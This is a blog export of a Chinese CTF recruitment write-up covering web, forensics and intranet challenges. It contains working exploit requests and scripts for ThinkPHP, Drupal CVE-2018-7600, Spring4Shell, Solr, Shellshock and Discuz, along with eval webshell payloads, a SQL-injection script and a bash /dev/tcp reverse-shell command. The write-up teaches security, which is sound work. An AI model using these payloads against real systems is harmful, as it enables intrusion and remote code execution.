{"meta":{"title":"Narcherの小窝","subtitle":"","description":"","author":"Narcher Alter","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"YulinSec-Recruit-2023-WP","slug":"YulinSec Recruit 2023 WP","date":"2024-11-08T06:38:16.523Z","updated":"2024-11-08T06:56:59.706Z","comments":true,"path":"2024/11/08/YulinSec Recruit 2023 WP/","link":"","permalink":"http://example.com/2024/11/08/YulinSec%20Recruit%202023%20WP/","excerpt":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup","text":"作者：Narcher 时间：2023&#x2F;10&#x2F;18 分类：writeup [Baby]†签到†密文： 密码本： 解码之后：，之后再将解码后的表按先一三后二四的顺序解读，即得明文：WELCOME TO THE CTF GAME！ 题目要求我们将Flag以YulinSec{}包裹，并在每个英文单词间加入单下划线，所有英文字母均为小写。 处理一下得：YulinSec{welcome_to_the_ctf_game!} [Mid-]马赛克星球这题我只做出了第一问，太菜了~~~呜呜~ 根据题目描述我们得知图片先会被马赛克覆盖，后被系统处理后丢尽回收站，因此我们需要按顺序进行。首先进行系统处理的恢复，具体这么做呢？先把图片下载下来康康。 我们得到这个： （什么鬼东西啊！！！） 既然是系统处理，嗯~ o(￣▽￣)o……，啥也想不起来，那我们就按老一套先一把梭试试，先放进binwalk里康康： 发现藏得有东西，我们分离一下： 得到加密马赛克的代码（个人猜测可能和第二问有关）。 这一步操作结束了，并没有得到对第一问有用的信息，我们再去试试下一步经典操作：改图片宽高。 直接上github上找个脚本，恢复一下图片的宽高，用Deformed-Image-Restorer就不错 由此我们得到了被打上马赛克的图片，并得到了Flag: [Easy]盒武器你是？我们下载第一张图片： 放到google识图上看看，一眼武汉理工大学南湖校区的图书馆，但MD5之后交Flag发现不对，经询问铃兰小姐得知要交图书馆的名字，于是改成YulinSec{md5(武汉理工大学南湖校区心至楼)}。 第二问很奇怪，一眼是武汉长江大桥，拍摄视角看起来像是在龟山公园附近，但我把附近的景点都梭哈了一遍也没成功…… 你的名字是？第二问通过问出题人，发现是我猪鼻了，其实还是让题目描述误导了，题目描述举出的例子是人民公园，让我误以为是找公园名字了…… 位置确实是龟山公园没错，但景点应该写龟山风景区，于是改成YulinSec{md5(湖北省武汉市汉阳区龟山北路5号龟山风景区)}。 我怎么想不起来了&gt;w&lt;第三问的话看出题人QQ空间锁定好时间区间爆破就好了(貌似有更好的办法，但我还没找到)。 【Baby】babyurl本题考查ssrf。 这道题本来我是通过绕过localhost做的，后来才知道那是非预期，于是我又重新做了一遍。 首先我们访问题目网页。如下： 查看一下源码： &lt;!-- if(isset($_GET[&#39;urls&#39;]))&#123; $urls = $_GET[&#39;urls&#39;]; $url_host = parse_url($urls,PHP_URL_HOST); curl_get($urls); &#125; --&gt; 点击here得：Please access through local host 既然如此，看了源码再加上题目描述，我们就明白了这是一道ssrf bypass题，因此我们根据源码顺序构造url，GET传参urls,根据要求在头部添加http://,直接传127.0.0.1会被过滤： 因此我们根据题目描述中的格式构造传参?urls=http://foo@127.0.0.1:80@google.com/flag.php，得到flag。 原理就是利用parse_url与curl_get对url解析的不同方式来绕过。 【Baby】babyphp本题考查php的弱比较与强碰撞的绕过。 首先，是对弱比较的绕过。让a!&#x3D;b，但sha1值要相等，我们利用数组绕过： 原理为sha1函数无法处理数组，如果传入的是数组，那么会返回NULL，使二者比较起来相等。 再做第二问的强碰撞。 由于是===，无法使用数组绕过，并且代码是执行我们输入的Yu，而不是直接输出Flag，我们可以使用fastcoll对一句话木马进行处理，使其eval执行我们的一句话木马，进而用蚁剑连接。工具的具体使用方法就请去百度学习吧，这里直接贴出payload:?Yu=%40eval%28%24_POST%5B%22cmd%22%5D%29%3B+%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%DAq%2B%97%8D%02%9B%5C%B5%86%B4%26%E9%DE%BC%CF%FF%FB%DF%F1%B9%BC4%89-%26%825u8%1D%F5J%F1%F9%C8%E0%E7%FF%E7%0F%0C%CC%11%A9%BB%D4%17%DE%85%B5j%F5%A9%26c%1Aa%89%0E%A3y%96E%A2%C1%F4%87f%9B%1E%F7%17%FA%86%E5%A1m%95%97k7%00%C9%26%7E%23%7E%84%B9%9FO_%11%AF%C1%98%CA%B0%2A%85%89%93%DE%ED%9D%EB%98C%EE%E0%02%1C%23V%DD%C2%15%D5%F1iI%D9%21%1E%8E%F8%05&amp;lin=%40eval%28%24_POST%5B%22cmd%22%5D%29%3B+%3F%3E%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%DAq%2B%97%8D%02%9B%5C%B5%86%B4%26%E9%DE%BC%CF%FF%FB%DFq%B9%BC4%89-%26%825u8%1D%F5J%F1%F9%C8%E0%E7%FF%E7%0F%0C%CC%11%A9%3B%D4%17%DE%85%B5j%F5%A9%26c%1Aa%89%8E%A3y%96E%A2%C1%F4%87f%9B%1E%F7%17%FA%86%E5%A1m%95%97k7%00I%26%7E%23%7E%84%B9%9FO_%11%AF%C1%98%CA%B0%2A%85%89%93%DE%ED%9D%EB%98Cn%E1%02%1C%23V%DD%C2%15%D5%F1iI%D9%A1%1E%8E%F8%05 先在网页中执行一下，然后直接用蚁剑。 根目录发现flag2：YulinSec&#123;2b5e2408ee27c31493b3b4728a1afb85&#125;。 【Baby】babyunserialize本题考查基本的php反序列化。 下面我们先构造第一问的payload: &lt;?php$auth = array( &quot;username&quot; =&gt; &quot;YulinSec&quot;, &quot;passwd&quot; =&gt; &quot;i_love_php_unserialize&quot;,);echo serialize($auth);?&gt; 输出：a:2:&#123;s:8:&quot;username&quot;;s:8:&quot;YulinSec&quot;;s:6:&quot;passwd&quot;;s:22:&quot;i_love_php_unserialize&quot;;&#125; 用Hackbar传参得flag1: 接着我们构造第二问的payload: 这里需要提到两个知识点：__construct()魔术方法与php中的引用赋值（具体请自行百度）。 我们将构造的$a的序列化中的空改为%00，payload为：?data=O:5:&quot;Yulin&quot;:4:&#123;s:12:&quot;%00Yulin%00user1&quot;;i:20421610;s:12:&quot;%00Yulin%00user2&quot;;R:2;s:8:&quot;%00*%00pass1&quot;;i:116759636;s:8:&quot;%00*%00pass2&quot;;R:3;&#125; 之后传入得flag2: [EASY]Script Kiddie这题看题目要求，就知道是要学会当脚本小子。因此我们直接去网上找相应的exp即可。 第一题： 有经验的话应该看一眼就知道这是典型的thinkphp的漏洞了，直接去网上搜，这里贴上我搜到的一篇博客：攻防世界 ThinkPHP V5（漏洞解析及利用）-CSDN博客 直接payload:?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag拿到flag。（注：cat /flag可换成其他命令进行执行） 第二题： 继续去搜drupal的相关漏洞，挨个对比，发现是CVE-2018-7600，直接利用现成的payload: POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: 121.5.35.176:30003Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: http://121.5.35.176:30003/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: JSESSIONID=F52208D5FDBBB4330779120E1AD41487Connection: closeContent-Type:application/x-www-form-urlencodedContent-Length: 110 form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=cat /flag 得到flag：YulinSec&#123;svt9di2rrew26kysr3b3oipkobq40sao&#125;。 第三题： 继续去网上搜spring相关的漏洞，挨个对比，发现是CVE-2022-22965。之后便是按部就班的来。 发送以下请求以更改 Apache Tomcat 中的日志记录配置并将日志写入 JSP 文件： GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1Host: 121.5.35.176:30004Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closesuffix: %&gt;//c1: Runtimec2: &lt;%DNT: 1Content-Length: 2 然后，访问刚才的 JSP webshell，并执行任意命令，得到flag： 【Mid】MidBypass这道题应该是想教一下蚁剑的基本用法。 首先根据hint中的后门提示，用蚁剑连接： 之后点击即送flag1:YulinSec&#123;1602bc263c2a236f7f4a38859abb8d02&#125; 第二问大概就是要学一下蚁剑的插件使用: 之后直接在根目录下找到flag2: 【Mid】苕皮本题我是通过非预期来做的，之后立马被修了，呜呜呜~~~ 之后也没时间做这个题了，大概把我非预期的思路讲一讲吧。 在我做非预期解的时候，没有对base的过滤，因此，在经过几下本地传参测试后发现，过滤器在读取$shaopi时会控制字符的数量，后来经查证，貌似必须输入3的倍数。于是我们可以利用base64编码后可以随便加减等号的特性进行绕过。payload为：?filter=convert.base64-decode|&amp;shaopi=PChzaGFvcGkpPg 【Baby】RseaE(季末大酬宾)第一次做内网题，瘫~~~ 首先给linux配置上ssh的socks5代理具体方法详见此博客http://t.csdnimg.cn/fYTE4，之后便可直接在虚拟机上进行操作，无需将文件传输到服务器上。 直接利用fscan扫描内网存活主机，得： CVE-2019-17558：先访问http://10.0.20.121/solr/Yulin/config,写份脚本修改params.resource.loader.enabled为true，至此一切准备就绪。脚本贴在下面： import requestsimport json url = &quot;http://10.0.20.121/solr/Yulin/config&quot;headers = &#123; &quot;Content-Type&quot;: &quot;application/json&quot;,&#125;data = &#123; &quot;update-queryresponsewriter&quot;: &#123; &quot;startup&quot;: &quot;lazy&quot;, &quot;name&quot;: &quot;velocity&quot;, &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;, &quot;template.base.dir&quot;: &quot;&quot;, &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;, &quot;params.resource.loader.enabled&quot;: &quot;true&quot; &#125;&#125; response = requests.post(url, headers=headers, data=json.dumps(data)) print(response.status_code)print(response.text) 之后便可进行rce命令执行。 命令执行的payload稍微改一下就能用了，至于脚本，写一个能发包的就行。如下： import requests url = &#39;http://10.0.20.121/solr/Yulin/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27cat%20/flag%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&#39; response = requests.get(url) print(response.text) CVE-2014-6271：这个比较简单，一个脚本就出来了： import requestsimport json url = &quot;http://10.0.20.156/yulin.cgi&quot;headers = &#123; &quot;User-Agent&quot;: &quot;() &#123; :; &#125;; echo; /bin/cat /flag&quot;,&#125; response = requests.post(url, headers=headers) print(response.status_code)print(response.text) 原理大概是该Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以()&#123;开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。 CVE-2019-0230：这个就麻烦许多（主要是没回显，需要将webshell打到portmap的监听端口上，之后在转发端口查看），在这里就讲一下大体思路吧，就不一步步来了（太麻烦了），首先，先将portmap传到目标服务器，之后设置监听端口与转发端口：./portmap -m 2 -p1 7003 -h2 10.0.20.111 -p2 7004随后利用脚本将命令bash -i &gt;&amp; /dev/tcp/10.0.20.111/7003 0&gt;&amp;1执行以实现反弹shell的目的，之后在本地利用proxychains通过nc监听7004端口数据，发现shell成功反弹，执行cat /flag获取flag：YulinSec&#123;Wo0!_s2_059_1s_s0_Danger0uS&#125; CVE-2014-0160：这个就简单许多了，直接用msf框架里现成的攻击模块就行了。下面的操作便是根据博客https://blog.csdn.net/weixin_39190897/article/details/106879383中的步骤完成。 先执行msfconsole运行msf框架： 再使用search heartbleed查找攻击模块： 之后执行命令use auxiliary/scanner/ssl/openssl_heartbleed选择第一个攻击模块： 设置对应的主机、端口参数： 最后运行run命令，可以看见靶机的64KB信息： 信息中间藏着flag：YulinSec&#123;Wo0!_My_heArt_1s_B133dinG&#125; 【Mid】链式反应本题只做了第一问，还是太菜了，要多练…… 求你先注册吧TAT &amp; 致命后台：进去之后发现是个论坛： 先随便注册一个账号试试（注意：这时候先看看admin账号是否有人，发现已经存在，说明我们注册之后要拿到admin账号的密码）： 注册之后发现有个系统提醒，点进来是admin账号的密码，因此我们可以利用这个来登录admin账号管理后台。 登录之后要干什么呢？（你问我我也不知道，当然是google啦！！！） 搜索Discuz x3.4 getshell，找到了一篇写的特别好的博客：https://www.svenbeast.com/post/discuzx34-hou-tai-xiu-gai-uc_center-pei-zhi-getshell/ 之后便是进入右上角的管理中心—站长—UCenter设置。 1.进入后台站长-UCenter设置，修改UCenter通信密钥为123456并记录下来，填入code.php，修改UC_API&#x3D;http://recruit.xxf.world:12088/uc_server&#39;);eval($_POST[sven]);//，点击保存 2.用大佬的脚本生成code参数的值(注意：此时操作必须加速，如果当超时之后，传参会返回别的内容而不是1，此时code值需要重新生成)： &lt;?php //code.php源代码，可直接使用$uc_key=&quot;123456&quot;;//此处填写刚才UCenter设置的值$time = time() + 720000;$str = &quot;time=&quot;.$time.&quot;&amp;action=updateapps&quot;;$code = authcode($str,&quot;ENCODE&quot;,$uc_key);$code = str_replace(&#39;+&#39;,&#39;%2b&#39;,$code);$code = str_replace(&#39;/&#39;,&#39;%2f&#39;,$code);echo $code; function authcode($string, $operation = &#39;DECODE&#39;, $key = &#39;&#39;, $expiry = 0) &#123; $ckey_length = 4; $key = md5($key != &#39;&#39; ? $key : &#39;123456&#39;); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == &#39;DECODE&#39; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#39;&#39;; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == &#39;DECODE&#39; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#39;%010d&#39;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = &#39;&#39;; $box = range(0, 255); $rndkey = array(); for($i = 0; $i &lt;= 255; $i++) &#123; $rndkey[$i] = ord($cryptkey[$i % $key_length]); &#125; for($j = $i = 0; $i &lt; 256; $i++) &#123; $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; &#125; for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123; $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); &#125; if($operation == &#39;DECODE&#39;) &#123; if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123; return substr($result, 26); &#125; else &#123; return &#39;&#39;; &#125; &#125; else &#123; return $keyc.str_replace(&#39;=&#39;, &#39;&#39;, base64_encode($result)); &#125;&#125;?&gt; 3.带code参数GET发送请求(发送这个请求前后台功能都是不正常的，发送后后台恢复正常)： 请求包如下（注意，code需要替换成上边代码跑出来的值）： GET /api/uc.php?code=3261GqyMWCKWcBrmvnAR%2fMsytT4CniPufkSLlq8qgFENXGRbemdZM%2fO0tQ5UDOmm0gkfa3FziIaBUL6vu2s HTTP/1.1Host: recruit.xxf.world:12088Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,ar;q=0.8Connection: closeContent-Length: 127 &lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;root&gt;&lt;item id=&quot;UC_API&quot;&gt;http://recruit.xxf.world:12088/uc_server&lt;/item&gt;&lt;/root&gt; 4.此时 http://recruit.xxf.world:12088/config/config_ucenter.php就是我们的shell地址，至此getshell结束 5.进入根目录即可查看flag: [BABY]Yulin大超市题目本身不难，但具体操作比较繁琐，本人并没有全部做完，在此仅提供部分问的具体思路。 先根据网上的教程，把vmdk装在vmware上，并启动。 古老内核：cat /etc/redhat-release 旧日石板：启动宝塔，进入宝塔页面后点击左侧数据库，查看密码即可 积尘网页：进入网页后查看左上角图片即可： 草灰蛇线：宝塔页面下载后直接输入命令sha256sum 文件名查看 链颜如玉：九尾狐？？？铃兰小姐！！！ 蠕形混沌：robots.txt了解一下 [Mid]Flag的秘密本题考查内存取证。 1.先查看系统信息： 2.列出所有进程./volatility -f Dump.raw --profile=Win2003SP1x86 pslist： 发现notepad与mspaint两个可疑进程。 3.查看敏感文件： 4.提取flag.txt，./volatility -f Dump.raw --profile=Win2003SP1x86 dumpfiles -Q 0x060f95d8 --dump-dir=.: 查看文件内容，发现只有一串数字：70691670853271109852681369060149805628073794361873811272895446916236918634537737802124349238876320719507791592011549293924620129044462418733627976091293608166259846132773460344531124208572819109443346803355186858756595020342162362128266333303983191990037268180788288653684131880322571968703181766706931560885205101352007538331846213613023266466639921413852926790888220321442027205178887750649656145860474727432919114738728373475836303102255486346191364877477938535572331216821254191679994156591750446573045994279439932542854983843840 猜测和题目描述中的数学公式有关，于是进行万能的google，发现这其实是tupper公式中的key。 5.画图(画图时千万别用github上的脚本，不然会和我一样变得不幸) 提供一个在线网站：https://tuppers-formula.ovh/ 翻转180°得flag前半部分：M2tH_1z_ 继续推测，notepad中有flag前半部分，那么mspaint中大概率有flag的后半部分。 6.提取mspaint进程./volatility -f Dump.raw --profile=Win2003SP1x86 memdump -p 2148 --dump-dir=./ ，再将dmp后缀改为data，之后用GIMP软件查看，不断改变位移、宽高，即可得真实图像。 180°翻转后再镜像翻转即为flag后半部分。 完整flag为：YulinSec&#123;M2tH_1z_s0_iNtlsTInG&#125; [MID-]ezjavaflag1首先我们先看访问一下题目网页，由此可知要读取根目录下的flag1和flag2： 下载题目附件，之后反编译看源码。 由此可知传参方式：当访问&#x2F;flag1&#x2F;*目录时，会转到&#x2F;tmp&#x2F;*，而tmp目录的上一层目录即为根目录。 于是我们便可读取flag1: [MID+]猫物语这道题属实是思路新奇，是我没见过的类型。 先看一下题目描述吧： 根据题目描述我们可以知道本题考查sql注入，且无法使用延时注入和布尔盲注，于是我们可以从“所有内容在原本的基础上都会被加上随机一小段长度的喵！”上下手，增加原本内容的长度，使得返回的“喵”数量超过一定程度，并借此判断是否注入成功。之后的思路就和盲注思路一样了。 脚本如下： import requestsimport time chars = range(48, 129, 1)flag = &#39;&#39;global length length = 50 close = &quot;?id=-1&quot;for i in range(1, length + 1): for char1 in chars: url = &quot;http://124.220.110.41:20001/&quot; payload = &quot; union select 1,2,if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),%d,1))=%d,repeat(&#39;a&#39;,50),1)--+&quot; % ( i, char1) url = url + close + payload res = requests.get(url) print(url + &#39;\\n&#39;) if &quot;喵&quot; * 50 in res.text: flag = flag + chr(char1) print(&quot;flag: &quot; + flag) break print(&quot;flag: &quot; + flag)print(&#39;flag:&#39;, flag) payload请自行根据想要得到的内容进行更改。","categories":[],"tags":[]}],"categories":[],"tags":[]}